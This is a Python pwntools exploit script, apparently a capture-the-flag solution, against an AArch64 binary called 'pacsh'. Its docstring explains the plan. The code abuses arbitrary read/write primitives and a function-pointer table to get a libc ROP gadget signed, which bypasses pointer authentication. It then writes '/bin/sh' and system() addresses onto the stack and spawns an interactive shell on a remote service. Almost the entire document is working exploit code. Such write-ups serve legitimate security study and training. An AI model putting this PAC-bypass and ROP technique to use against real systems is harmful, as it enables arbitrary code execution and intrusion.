"""
By overwriting BUILTINS[i] and then calling show_help, we can get an arbitrary
signing gadget. This lets us sign anything so we can bypass pac and arbitrarily
control $pc through the (*fptr)() call. Or you could bruteforce the pac.

We want to call system("/bin/sh"), so we should look for a gadget that lets us
control x0 and then ideally transfer $pc control to something else we control.
A perfect gadget for this is in libc:

0x00000000000d8854 : ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x150 ; ret

So by writing a ptr to "/bin/sh" into $sp + 0x60, and then writing the address
of system into $sp + 8, when we call this gadget, we will get a shell.

The stack moves around a bit depending on env vars (presumably), so we can use
the read to find the correct sp to write to.
"""

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'aarch64'

def read64(addr):
    conn.sendlineafter(b'pacsh> ', hex(read64_addr).encode())
    conn.sendlineafter(b'read64> ', f'{hex(addr)}'.encode())
    return int(conn.recvline().decode(), 16)

def write64(addr, val):
    conn.sendlineafter(b'pacsh> ', hex(write64_addr).encode())
    conn.sendlineafter(b'write64> ', f'{hex(addr)} {hex(val)}'.encode())

def get_help():
    conn.sendlineafter(b'pacsh> ', hex(help_addr).encode())

def parse_help():
    help_addr = int(conn.recvline().decode().split('help: ')[1], 16)
    ls_addr = int(conn.recvline().decode().split('ls: ')[1], 16)
    read64_addr = int(conn.recvline().decode().split('read64: ')[1], 16)
    write64_addr = int(conn.recvline().decode().split('write64: ')[1], 16)
    return [help_addr, ls_addr, read64_addr, write64_addr]

# conn = process(['qemu-aarch64', '-g', '1234', 'pacsh'])
# conn = process(['qemu-aarch64', 'pacsh'])
conn = remote('0.0.0.0', 1337)
print(conn.recvline().decode())
help_addr, _, read64_addr, write64_addr = parse_help()

libc_base = 0x5501870000
binsh = libc_base + 0x14d9f8
system = libc_base + 0x46d94
call_gadget = libc_base + 0xd8854
BUILTINS_ARRAY = 0x5500012010

sp = 0x5501821400
while True:
    sp += 8
    x = read64(sp)
    print('searching for sp...', hex(sp), hex(x))
    if x == read64_addr & 0xffffffffff:
        sp -= 0x10
        print('ok!', hex(sp))
        break

write64(sp + 0x60, binsh)
write64(sp + 0x8, system)
write64(BUILTINS_ARRAY + 8 * 3, call_gadget)
get_help()
_, gadget_authed_addr, _, _ = parse_help()

print('authed gadget:', hex(gadget_authed_addr))
conn.sendlineafter(b'pacsh> ', hex(gadget_authed_addr).encode())

conn.interactive()
